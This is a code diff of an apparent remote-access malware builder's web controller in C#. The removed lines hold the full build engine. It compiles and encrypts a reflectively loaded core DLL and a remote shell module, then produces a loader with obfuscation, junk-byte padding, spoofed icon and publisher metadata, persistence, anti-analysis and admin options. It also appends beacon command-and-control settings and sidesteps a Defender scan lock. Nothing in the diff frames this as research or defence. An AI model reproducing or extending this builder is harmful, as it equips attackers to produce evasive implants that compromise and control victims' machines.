@@ -1,13 +1,9 @@
-using System.Collections.Concurrent;
-using System.Diagnostics;
-using System.Security.Cryptography;
 using System.Text;
 using System.Text.Json;
 using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Mvc;
-using Microsoft.Extensions.Options;
 using LibraNextgen.Common.Models;
-using LibraNextgen.Service.Configuration;
+using LibraNextgen.Service.Services;
 
 namespace LibraNextgen.Service.Controllers;
 
@@ -16,59 +12,11 @@ namespace LibraNextgen.Service.Controllers;
 [Authorize]
 public class BuilderController : ControllerBase
 {
-    private static readonly string OutputBase = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
-    private static readonly string HistoryFile = Path.Combine(OutputBase, "builds.json");
-    private static readonly string TemplateDir = Path.Combine(OutputBase, "loader-template");
+    private readonly BuilderBuildService _buildService;
 
-    private static readonly string RustAgentDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent-rs"));
-
-    private static readonly Dictionary<string, PlatformTarget> PlatformTargets = new()
+    public BuilderController(BuilderBuildService buildService)
     {
-        ["x64"] = new("x86_64-pc-windows-msvc", "windows"),
-        ["x86"] = new("i686-pc-windows-msvc", "windows"),
-    };
-
-    private static readonly string ModulesDir = Path.Combine(OutputBase, "modules");
-
-    private static readonly string IconUploadDir = Path.Combine(Path.GetTempPath(), "libra-build-icons");
-    private static readonly object _buildLock = new();
-    private static readonly ConcurrentDictionary<string, BuildJob> _activeJobs = new();
-
-    private readonly BeaconSettings _beaconSettings;
-
-    public BuilderController(IOptions<BeaconSettings> beaconSettings)
-    {
-        _beaconSettings = beaconSettings.Value;
-    }
-
-    // ── Build history persistence ──────────────────────────────────────
-
-    private static List<BuildRecord> LoadHistory()
-    {
-        try
-        {
-            if (System.IO.File.Exists(HistoryFile))
-            {
-                var json = System.IO.File.ReadAllText(HistoryFile);
-                return JsonSerializer.Deserialize<List<BuildRecord>>(json) ?? new List<BuildRecord>();
-            }
-        }
-        catch { }
-        return new List<BuildRecord>();
-    }
-
-    private static void SaveHistory(List<BuildRecord> records)
-    {
-        try
-        {
-            Directory.CreateDirectory(OutputBase);
-            var json = JsonSerializer.Serialize(records);
-            System.IO.File.WriteAllText(HistoryFile, json);
-        }
-        catch (Exception ex)
-        {
-            Console.Error.WriteLine($"[WARN] Failed to save build history: {ex.Message}");
-        }
+        _buildService = buildService;
     }
 
     // ── Icon upload ────────────────────────────────────────────────────
@@ -88,9 +36,9 @@ public class BuilderController : ControllerBase
 
         try
         {
-            Directory.CreateDirectory(IconUploadDir);
+            Directory.CreateDirectory(BuilderBuildService.IconUploadDir);
             var fileName = $"{Guid.NewGuid():N}{ext}";
-            var filePath = Path.Combine(IconUploadDir, fileName);
+            var filePath = Path.Combine(BuilderBuildService.IconUploadDir, fileName);
             await using var stream = System.IO.File.Create(filePath);
             await file.CopyToAsync(stream, ct);
             return Ok(new { path = filePath });
@@ -106,12 +54,12 @@ public class BuilderController : ControllerBase
     [HttpPost("build")]
     public IActionResult Build([FromBody] BuildConfigRequest req)
     {
-        if (!PlatformTargets.ContainsKey(req.Platform))
+        if (!BuilderBuildService.PlatformTargets.ContainsKey(req.Platform))
             return BadRequest(new { error = $"Unsupported platform: {req.Platform}" });
 
         var buildId = Guid.NewGuid().ToString("N")[..8];
-        var ext = PlatformTargets[req.Platform].Os == "windows" ? ".exe" : "";
-        var record = new BuildRecord
+        var ext = BuilderBuildService.PlatformTargets[req.Platform].Os == "windows" ? ".exe" : "";
+        var record = new Models.BuildRecord
         {
             Id = buildId,
             Platform = req.Platform,
@@ -122,15 +70,15 @@ public class BuilderController : ControllerBase
         };
 
         // Save initial record
-        var history = LoadHistory();
+        var history = BuilderBuildService.LoadHistory();
         history.Insert(0, record);
-        SaveHistory(history);
+        BuilderBuildService.SaveHistory(history);
 
-        var job = new BuildJob { Record = record };
-        _activeJobs[buildId] = job;
+        var job = new Models.BuildJob { Record = record };
+        BuilderBuildService.ActiveJobs[buildId] = job;
 
         // Run Rust build in background
-        _ = Task.Run(() => RunBuildAsync(buildId, req, job));
+        _ = Task.Run(() => _buildService.RunBuildAsync(buildId, req, job));
 
         return Ok(new { buildId });
     }
@@ -144,10 +92,10 @@ public class BuilderController : ControllerBase
         Response.Headers["Cache-Control"] = "no-cache";
         Response.Headers["Connection"] = "keep-alive";
 
-        if (!_activeJobs.TryGetValue(buildId, out var job))
+        if (!BuilderBuildService.ActiveJobs.TryGetValue(buildId, out var job))
         {
             // Build may have already completed — check history
-            var history = LoadHistory();
+            var history = BuilderBuildService.LoadHistory();
             var record = history.FirstOrDefault(r => r.Id == buildId);
             if (record != null)
             {
@@ -196,7 +144,7 @@ public class BuilderController : ControllerBase
     [HttpGet("list")]
     public IActionResult List()
     {
-        var history = LoadHistory();
+        var history = BuilderBuildService.LoadHistory();
         // Don't send full config in list view, just summary
         var items = history.Select(r => new
         {
@@ -215,7 +163,7 @@ public class BuilderController : ControllerBase
     [HttpGet("info/{buildId}")]
     public IActionResult Info(string buildId)
     {
-        var history = LoadHistory();
+        var history = BuilderBuildService.LoadHistory();
         var record = history.FirstOrDefault(r => r.Id == buildId);
         if (record == null)
             return NotFound(new { error = "Build not found." });
@@ -225,12 +173,12 @@ public class BuilderController : ControllerBase
     [HttpGet("download/{buildId}")]
     public IActionResult Download(string buildId)
     {
-        var history = LoadHistory();
+        var history = BuilderBuildService.LoadHistory();
         var record = history.FirstOrDefault(r => r.Id == buildId);
         if (record == null)
             return NotFound(new { error = "Build not found." });
 
-        var filePath = Path.Combine(OutputBase, buildId, record.FileName);
+        var filePath = Path.Combine(BuilderBuildService.OutputBase, buildId, record.FileName);
         if (!System.IO.File.Exists(filePath))
             return NotFound(new { error = "Build file not found on disk." });
 
@@ -242,20 +190,20 @@ public class BuilderController : ControllerBase
     public IActionResult DeleteBuild(string buildId)
     {
         // If build is still running, don't allow delete
-        if (_activeJobs.TryGetValue(buildId, out _))
+        if (BuilderBuildService.ActiveJobs.TryGetValue(buildId, out _))
             return BadRequest(new { error = "Cannot delete a build in progress." });
 
-        var history = LoadHistory();
+        var history = BuilderBuildService.LoadHistory();
         var record = history.FirstOrDefault(r => r.Id == buildId);
         if (record != null)
         {
             history.Remove(record);
-            SaveHistory(history);
+            BuilderBuildService.SaveHistory(history);
         }
 
         // Clean up files
-        var buildDir = Path.Combine(OutputBase, buildId);
-        lock (_buildLock)
+        var buildDir = Path.Combine(BuilderBuildService.OutputBase, buildId);
+        lock (BuilderBuildService.BuildLock)
         {
             try { if (Directory.Exists(buildDir)) Directory.Delete(buildDir, true); }
             catch { /* best effort */ }
@@ -271,8 +219,8 @@ public class BuilderController : ControllerBase
     {
         try
         {
-            if (Directory.Exists(TemplateDir))
-                Directory.Delete(TemplateDir, true);
+            if (Directory.Exists(BuilderBuildService.TemplateDir))
+                Directory.Delete(BuilderBuildService.TemplateDir, true);
             return Ok(new { status = "ok", message = "Loader template cleared. Next build will recompile." });
         }
         catch (Exception ex)
@@ -284,8 +232,8 @@ public class BuilderController : ControllerBase
     [HttpGet("template")]
     public IActionResult TemplateStatus()
     {
-        var platforms = Directory.Exists(TemplateDir)
-            ? Directory.GetDirectories(TemplateDir).Select(d =>
+        var platforms = Directory.Exists(BuilderBuildService.TemplateDir)
+            ? Directory.GetDirectories(BuilderBuildService.TemplateDir).Select(d =>
             {
                 var file = Directory.GetFiles(d).FirstOrDefault();
                 return new
@@ -313,7 +261,7 @@ public class BuilderController : ControllerBase
 
         try
         {
-            var platformDir = Path.Combine(TemplateDir, platform);
+            var platformDir = Path.Combine(BuilderBuildService.TemplateDir, platform);
             Directory.CreateDirectory(platformDir);
 
             var fileName = platform == "arm" ? "loader" : "loader.exe";
@@ -335,7 +283,7 @@ public class BuilderController : ControllerBase
     [HttpDelete("template/{platform}")]
     public IActionResult DeleteTemplate(string platform)
     {
-        var platformDir = Path.Combine(TemplateDir, platform);
+        var platformDir = Path.Combine(BuilderBuildService.TemplateDir, platform);
         if (!Directory.Exists(platformDir))
             return NotFound(new { error = $"Template for platform '{platform}' not found." });
 
@@ -356,511 +304,11 @@ public class BuilderController : ControllerBase
     [AllowAnonymous]
     public IActionResult DownloadCore(string buildId)
     {
-        var corePath = Path.Combine(OutputBase, buildId, "core.bin");
+        var corePath = Path.Combine(BuilderBuildService.OutputBase, buildId, "core.bin");
         if (!System.IO.File.Exists(corePath))
             return NotFound(new { error = "Core not found." });
 
         var bytes = System.IO.File.ReadAllBytes(corePath);
         return File(bytes, "application/octet-stream", "core.bin");
-    }
-
-    // ── Build engine ───────────────────────────────────────────────────
-
-    private async Task RunBuildAsync(string buildId, BuildConfigRequest req, BuildJob job)
-    {
-        var tempDir = Path.Combine(OutputBase, buildId);
-        var targetDir = Path.Combine(tempDir, "target");
-
-        try
-        {
-            lock (_buildLock)
-            {
-                if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true);
-                Directory.CreateDirectory(tempDir);
-            }
-
-            // Check cargo availability
-            job.Log("Checking Rust toolchain...");
-            var cargoCheck = await RunProcessAsync("cargo", "--version", job);
-            if (cargoCheck.ExitCode != 0)
-            {
-                job.Fail("Cargo/Rust is not installed. Install from https://rustup.rs");
-                UpdateHistory(job);
-                return;
-            }
-            job.Log($"Rust toolchain: {cargoCheck.Stdout.Trim()}");
-
-            // Determine target triple + OS
-            var target = PlatformTargets[req.Platform]; // Build() already validated the key
-            var targetTriple = target.Triple;
-            var targetOs = target.Os;
-            var targetArg = $"--target {targetTriple}";
-
-            // Desktop mode: add --features desktop
-            var featuresArg = req.ApplicationType == "Desktop" ? "--features desktop" : "";
-
-            // Set RUSTFLAGS for strip if requested
-            var envVars = new Dictionary<string, string>();
-            if (req.StripSymbols)
-            {
-                envVars["RUSTFLAGS"] = "-C strip=symbols";
-                job.Log("Strip symbols enabled (RUSTFLAGS=-C strip=symbols)");
-            }
-
-            var isWindows = targetOs == "windows";
-            var isMacos = targetOs == "macos";
-
-            var releaseDir = Path.Combine(targetDir, targetTriple, "release");
-            var coreDllName = isWindows ? "core.dll" : isMacos ? "libcore.dylib" : "libcore.so";
-            var loaderExeName = isWindows ? "loader.exe" : "loader";
-            var moduleExt = isWindows ? "dll" : isMacos ? "dylib" : "so";
-
-            // ══════════════════════════════════════════════════════════════
-            // Stage 1: Build Core DLL from source
-            // ══════════════════════════════════════════════════════════════
-            job.Log($"=== Stage 1: Building Core DLL ({targetTriple}) ===");
-            var coreBuildArgs = $"build --release {targetArg} -p core --target-dir \"{targetDir}\"";
-            job.Log($"cargo {coreBuildArgs}");
-
-            var coreBuildResult = await RunProcessAsync("cargo", coreBuildArgs, job, RustAgentDir, envVars);
-            if (coreBuildResult.ExitCode != 0)
-            {
-                job.Fail($"Core build failed (exit code {coreBuildResult.ExitCode})");
-                UpdateHistory(job);
-                return;
-            }
-
-            var coreDllPath = Path.Combine(releaseDir, coreDllName);
-            if (!System.IO.File.Exists(coreDllPath))
-            {
-                var found = Directory.GetFiles(releaseDir, "*core*")
-                    .FirstOrDefault(f => f.EndsWith(".dll") || f.EndsWith(".so") || f.EndsWith(".dylib"));
-                if (found != null) coreDllPath = found;
-            }
-
-            if (!System.IO.File.Exists(coreDllPath))
-            {
-                job.Fail($"Core DLL not found at {releaseDir}");
-                UpdateHistory(job);
-                return;
-            }
-
-            // Stage 1.5: Validate core for reflective loading (PE/Windows only).
-            if (isWindows)
-            {
-                job.Log("=== Stage 1.5: Validating Core DLL for reflective loading ===");
-                var srdiArgs = $"run --release -p srdi --target-dir \"{targetDir}\" -- \"{coreDllPath}\" core_main";
-                var srdiResult = await RunProcessAsync("cargo", srdiArgs, job, RustAgentDir, envVars);
-                if (srdiResult.ExitCode != 0)
-                {
-                    job.Fail("Core DLL validation failed — 'core_main' export not found or DLL is invalid");
-                    UpdateHistory(job);
-                    return;
-                }
-                job.Log("Core DLL validated: PE structure OK, 'core_main' export present");
-            }
-
-            var coreDllBytes = await System.IO.File.ReadAllBytesAsync(coreDllPath);
-            job.Log($"Core DLL ready ({coreDllBytes.Length / 1024} KB)");
-
-            // ══════════════════════════════════════════════════════════════
-            // Stage 1.6: Build cloud modules (shell) for this platform
-            // ══════════════════════════════════════════════════════════════
-            job.Log($"=== Stage 1.6: Building shell module ({targetTriple}) ===");
-            var moduleBuildArgs = $"build --release {targetArg} -p shell-module --target-dir \"{targetDir}\"";
-            var moduleBuildResult = await RunProcessAsync("cargo", moduleBuildArgs, job, RustAgentDir, envVars);
-            if (moduleBuildResult.ExitCode == 0)
-            {
-                var moduleDllName = isWindows ? "shell_module.dll" : isMacos ? "libshell_module.dylib" : "libshell_module.so";
-                var modulePath = Path.Combine(releaseDir, moduleDllName);
-                if (!System.IO.File.Exists(modulePath))
-                {
-                    var found = Directory.GetFiles(releaseDir, "*shell*")
-                        .FirstOrDefault(f => f.EndsWith(".dll") || f.EndsWith(".so") || f.EndsWith(".dylib"));
-                    if (found != null) modulePath = found;
-                }
-                if (System.IO.File.Exists(modulePath))
-                {
-                    Directory.CreateDirectory(ModulesDir);
-                    System.IO.File.Copy(modulePath, Path.Combine(ModulesDir, $"shell.{moduleExt}"), true);
-                    job.Log($"Shell module deployed to build-output/modules/shell.{moduleExt}");
-                }
-                else
-                {
-                    job.Log("[WARN] shell module binary not found after build");
-                }
-            }
-            else
-            {
-                job.Log($"[WARN] shell module build failed (exit {moduleBuildResult.ExitCode}) — cloud shell unavailable");
-            }
-
-            // ══════════════════════════════════════════════════════════════
-            // Stage 2: Encrypt Core DLL
-            // ══════════════════════════════════════════════════════════════
-            job.Log("=== Stage 2: Encrypting Core DLL ===");
-
-            // Generate AES-256 key
-            var aesKey = RandomNumberGenerator.GetBytes(32);
-
-            // AES-256-GCM encrypt the core DLL
-            var aesNonce = RandomNumberGenerator.GetBytes(12);
-            using var aes = new AesGcm(aesKey, 16);
-            var ciphertext = new byte[coreDllBytes.Length];
-            var tag = new byte[16];
-            aes.Encrypt(aesNonce, coreDllBytes, ciphertext, tag);
-
-            // Combine: nonce(12) || ciphertext || tag(16)
-            var encryptedCore = new byte[aesNonce.Length + ciphertext.Length + tag.Length];
-            Buffer.BlockCopy(aesNonce, 0, encryptedCore, 0, aesNonce.Length);
-            Buffer.BlockCopy(ciphertext, 0, encryptedCore, aesNonce.Length, ciphertext.Length);
-            Buffer.BlockCopy(tag, 0, encryptedCore, aesNonce.Length + ciphertext.Length, tag.Length);
-
-            // Save encrypted core
-            var coreBinPath = Path.Combine(tempDir, "core.bin");
-            await System.IO.File.WriteAllBytesAsync(coreBinPath, encryptedCore);
-            job.Log($"Encrypted core saved: {encryptedCore.Length / 1024} KB");
-
-            // The AES key is kept server-side (written next to the build output).
-            // The loader negotiates it at runtime via /api/beacon/core-key, so no
-            // RSA private key is embedded in the agent binary.
-            var finalDir = Path.Combine(OutputBase, buildId);
-            Directory.CreateDirectory(finalDir);
-            await System.IO.File.WriteAllBytesAsync(Path.Combine(finalDir, "core.key"), aesKey);
-            job.Log("Core AES key written server-side");
-
-            // ══════════════════════════════════════════════════════════════
-            // Stage 3: Get Loader (from template or build fresh)
-            // ══════════════════════════════════════════════════════════════
-            job.Log("=== Stage 3: Preparing Loader ===");
-
-            var templatePlatformDir = Path.Combine(TemplateDir, $"{req.Platform}-{req.ApplicationType.ToLower()}");
-            var templatePath = Path.Combine(templatePlatformDir, loaderExeName);
-            var exePath = Path.Combine(tempDir, loaderExeName);
-
-            if (System.IO.File.Exists(templatePath))
-            {
-                // ── Use cached template ──
-                job.Log($"Using cached loader template: {templatePath}");
-                System.IO.File.Copy(templatePath, exePath, true);
-            }
-            else
-            {
-                // ── First time: compile loader and save as template ──
-                job.Log("No template found, compiling loader from source...");
-                var loaderBuildArgs = $"build --release {targetArg} {featuresArg} -p loader --target-dir \"{targetDir}\"";
-                job.Log($"cargo {loaderBuildArgs}");
-
-                var loaderBuildResult = await RunProcessAsync("cargo", loaderBuildArgs, job, RustAgentDir, envVars);
-                if (loaderBuildResult.ExitCode != 0)
-                {
-                    job.Fail($"Loader build failed (exit code {loaderBuildResult.ExitCode})");
-                    UpdateHistory(job);
-                    return;
-                }
-
-                var compiledLoader = Path.Combine(releaseDir, loaderExeName);
-                if (!System.IO.File.Exists(compiledLoader))
-                {
-                    var found = Directory.GetFiles(releaseDir, "*")
-                        .FirstOrDefault(f => Path.GetFileName(f) == "loader" || Path.GetFileName(f) == "loader.exe");
-                    if (found != null) compiledLoader = found;
-                }
-
-                if (!System.IO.File.Exists(compiledLoader))
-                {
-                    job.Fail($"Loader binary not found at {releaseDir}");
-                    UpdateHistory(job);
-                    return;
-                }
-
-                // Save as template for future builds
-                Directory.CreateDirectory(templatePlatformDir);
-                System.IO.File.Copy(compiledLoader, templatePath, true);
-                job.Log($"Loader template saved: {templatePath}");
-
-                // Copy to build directory
-                System.IO.File.Copy(compiledLoader, exePath, true);
-            }
-
-            job.Log($"Loader ready: {new FileInfo(exePath).Length / 1024} KB");
-
-            // ── Icon & metadata embedding via rcedit (Windows PE only) ──
-            if (isWindows && HasIconOrMetadata(req))
-            {
-                await EmbedIconAndMetadata(req, exePath, job);
-            }
-
-            // ── Goldberg obfuscation ──
-            if (req.EnableObfuscation)
-            {
-                job.Log("Running goldberg obfuscation...");
-                try
-                {
-                    var goldbergResult = await RunProcessAsync("goldberg", $"obfuscate \"{exePath}\"", job);
-                    if (goldbergResult.ExitCode == 0)
-                        job.Log("Goldberg obfuscation completed.");
-                    else
-                        job.Log($"[WARN] goldberg failed (exit {goldbergResult.ExitCode}), continuing without obfuscation.");
-                }
-                catch (Exception ex)
-                {
-                    job.Log($"[WARN] goldberg not available: {ex.Message}");
-                }
-            }
-
-            // ── Junk data injection ──
-            if (req.InjectJunkData && req.JunkDataMb > 0)
-            {
-                job.Log($"Injecting {req.JunkDataMb} MB junk data...");
-                var junk = RandomNumberGenerator.GetBytes(req.JunkDataMb * 1024 * 1024);
-                await using var fs = System.IO.File.Open(exePath, FileMode.Append);
-                await fs.WriteAsync(junk);
-            }
-
-            // ══════════════════════════════════════════════════════════════
-            // Stage 4: Inject Config into Loader (MUST be last — after obfuscation/junk)
-            // ══════════════════════════════════════════════════════════════
-            job.Log("=== Stage 4: Injecting Config ===");
-            var host = req.ServerHost;
-            var protocol = "http";
-            if (host.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
-                { protocol = "https"; host = host[8..]; }
-            else if (host.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
-                { host = host[7..]; }
-            var serverUrl = $"{protocol}://{host}:{req.ServerPort}";
-            var injectedConfig = new InjectedConfig
-            {
-                server_url = serverUrl,
-                register_path = "/api/beacon/register",
-                heartbeat_path = "/api/beacon/heartbeat",
-                result_path = "/api/beacon/result",
-                ws_path = "/ws/agent",
-                heartbeat_interval_ms = 3000,
-                jitter_percent = 0.2,
-                require_admin = req.RequireAdmin,
-                copy_to_path = req.CopyToAppData ? "sys64" : null,
-                enable_persistence = req.EnablePersistence,
-                core_download_path = $"/api/beacon/core/{buildId}",
-                core_key_path = "/api/beacon/core-key",
-                beacon_secret = _beaconSettings.Secret,
-                anti_analysis = req.AntiAnalysis,
-            };
-
-            var configJson = JsonSerializer.Serialize(injectedConfig);
-            var configBytes = Encoding.UTF8.GetBytes(configJson);
-            var magicBytes = Encoding.UTF8.GetBytes("LIBRA_CFG_BLOCK!");
-
-            await using (var fs = System.IO.File.Open(exePath, FileMode.Append))
-            {
-                await fs.WriteAsync(magicBytes);
-                var lenBytes = BitConverter.GetBytes((uint)configBytes.Length);
-                await fs.WriteAsync(lenBytes);
-                await fs.WriteAsync(configBytes);
-            }
-
-            job.Log($"Config injected: {configJson.Length} bytes");
-
-            // ── Move to final output ──
-            var finalPath = Path.Combine(finalDir, job.Record.FileName);
-            var finalCorePath = Path.Combine(finalDir, "core.bin");
-
-            // Write core.bin via system temp + move (avoids Defender directory scan lock)
-            job.Log("Writing core.bin...");
-            var tempCorePath = Path.Combine(Path.GetTempPath(), $"libra_{buildId}.bin");
-            await System.IO.File.WriteAllBytesAsync(tempCorePath, encryptedCore);
-            System.IO.File.Move(tempCorePath, finalCorePath, true);
-            job.Log($"core.bin written: {encryptedCore.Length / 1024} KB");
-
-            // Copy loader
-            job.Log("Copying loader...");
-            System.IO.File.Copy(exePath, finalPath, true);
-
-            var fileInfo = new FileInfo(finalPath);
-            job.Complete(fileInfo.Length);
-            job.Log($"Build complete: {finalPath} ({fileInfo.Length / 1024} KB), core.bin ({encryptedCore.Length / 1024} KB)");
-
-            UpdateHistory(job);
-        }
-        catch (Exception ex)
-        {
-            job.Fail($"Build failed: {ex.Message}");
-            UpdateHistory(job);
-        }
-        finally
-        {
-            _ = Task.Run(async () =>
-            {
-                await Task.Delay(30_000);
-                _activeJobs.TryRemove(buildId, out _);
-            });
-        }
-    }
-
-    private static async Task<ProcessResult> RunProcessAsync(string fileName, string arguments, BuildJob job, string? workingDir = null, Dictionary<string, string>? envVars = null)
-    {
-        var psi = new ProcessStartInfo(fileName, arguments)
-        {
-            RedirectStandardOutput = true,
-            RedirectStandardError = true,
-            UseShellExecute = false,
-            CreateNoWindow = true,
-        };
-        if (workingDir != null) psi.WorkingDirectory = workingDir;
-        if (envVars != null)
-        {
-            foreach (var (key, value) in envVars)
-                psi.Environment[key] = value;
-        }
-
-        using var proc = new Process { StartInfo = psi };
-        var stdoutTcs = new TaskCompletionSource<string>();
-        var stderrTcs = new TaskCompletionSource<string>();
-        var stdout = new StringBuilder();
-        var stderr = new StringBuilder();
-
-        proc.OutputDataReceived += (_, e) =>
-        {
-            if (e.Data != null) { job.Log(e.Data); stdout.AppendLine(e.Data); }
-            else stdoutTcs.TrySetResult(stdout.ToString());
-        };
-        proc.ErrorDataReceived += (_, e) =>
-        {
-            if (e.Data != null) { job.Log($"[stderr] {e.Data}"); stderr.AppendLine(e.Data); }
-            else stderrTcs.TrySetResult(stderr.ToString());
-        };
-
-        proc.Start();
-        proc.BeginOutputReadLine();
-        proc.BeginErrorReadLine();
-        await proc.WaitForExitAsync();
-        var stdoutStr = await stdoutTcs.Task;
-        var stderrStr = await stderrTcs.Task;
-
-        return new ProcessResult(proc.ExitCode, stdoutStr, stderrStr);
-    }
-
-    private static void UpdateHistory(BuildJob job)
-    {
-        var history = LoadHistory();
-        var idx = history.FindIndex(r => r.Id == job.Record.Id);
-        if (idx >= 0)
-            history[idx] = job.Record;
-        else
-            history.Insert(0, job.Record);
-        SaveHistory(history);
-    }
-
-    // ── Helpers ────────────────────────────────────────────────────────
-
-    private static bool HasIconOrMetadata(BuildConfigRequest req)
-    {
-        return !string.IsNullOrEmpty(req.IconUrl) ||
-               !string.IsNullOrEmpty(req.CompanyName) ||
-               !string.IsNullOrEmpty(req.FileDescription) ||
-               !string.IsNullOrEmpty(req.ProductName) ||
-               !string.IsNullOrEmpty(req.Copyright) ||
-               !string.IsNullOrEmpty(req.FileVersion);
-    }
-
-    private async Task EmbedIconAndMetadata(BuildConfigRequest req, string exePath, BuildJob job)
-    {
-        job.Log("Embedding icon/metadata (managed PE writer)...");
-
-        // Resolve icon bytes
-        byte[]? iconBytes = null;
-        if (!string.IsNullOrEmpty(req.IconUrl))
-        {
-            try
-            {
-                if (System.IO.File.Exists(req.IconUrl))
-                {
-                    iconBytes = await System.IO.File.ReadAllBytesAsync(req.IconUrl);
-                }
-                else if (req.IconUrl.StartsWith("http"))
-                {
-                    using var http = new HttpClient();
-                    iconBytes = await http.GetByteArrayAsync(req.IconUrl);
-                }
-            }
-            catch { job.Log("[WARN] Icon load failed, skipping icon."); }
-        }
-
-        var metadata = new LibraNextgen.Common.Pe.PeMetadata
-        {
-            CompanyName = req.CompanyName,
-            FileDescription = req.FileDescription,
-            ProductName = req.ProductName,
-            FileVersion = req.FileVersion,
-            ProductVersion = req.FileVersion,
-            Copyright = req.Copyright,
-            Icon = iconBytes,
-        };
-
-        try
-        {
-            var exeBytes = await System.IO.File.ReadAllBytesAsync(exePath);
-            var patched = LibraNextgen.Common.Pe.PeResourceWriter.Embed(exeBytes, metadata);
-            await System.IO.File.WriteAllBytesAsync(exePath, patched);
-            job.Log("Icon/metadata embedded successfully.");
-        }
-        catch (Exception ex)
-        {
-            job.Log($"[WARN] metadata embedding failed: {ex.Message}. Continuing without icon/metadata.");
-        }
-    }
-}
-
-// ── Supporting types ──────────────────────────────────────────────────
-
-public class BuildRecord
-{
-    public string Id { get; set; } = "";
-    public string Platform { get; set; } = "x64";
-    public BuildConfigRequest? Config { get; set; }
-    public string FileName { get; set; } = "";
-    public long FileSize { get; set; }
-    public string Status { get; set; } = "building"; // building, completed, failed
-    public string? Error { get; set; }
-    public string CreatedAt { get; set; } = "";
-    public string? CompletedAt { get; set; }
-}
-
-internal record struct ProcessResult(int ExitCode, string Stdout, string Stderr);
-
-public readonly record struct PlatformTarget(string Triple, string Os);
-
-public class BuildJob
-{
-    private readonly List<string> _logs = new();
-    private readonly object _lock = new();
-
-    public BuildRecord Record { get; set; } = null!;
-    public bool IsCompleted { get; private set; }
-
-    public void Log(string line)
-    {
-        lock (_lock) { _logs.Add(line); }
-    }
-
-    public List<string> GetLogs()
-    {
-        lock (_lock) { return _logs.ToList(); }
-    }
-
-    public void Complete(long fileSize)
-    {
-        IsCompleted = true;
-        Record.Status = "completed";
-        Record.FileSize = fileSize;
-        Record.CompletedAt = DateTime.UtcNow.ToString("o");
-    }
-
-    public void Fail(string error)
-    {
-        IsCompleted = true;
-        Record.Status = "failed";
-        Record.Error = error;
-        Record.CompletedAt = DateTime.UtcNow.ToString("o");
     }
 }
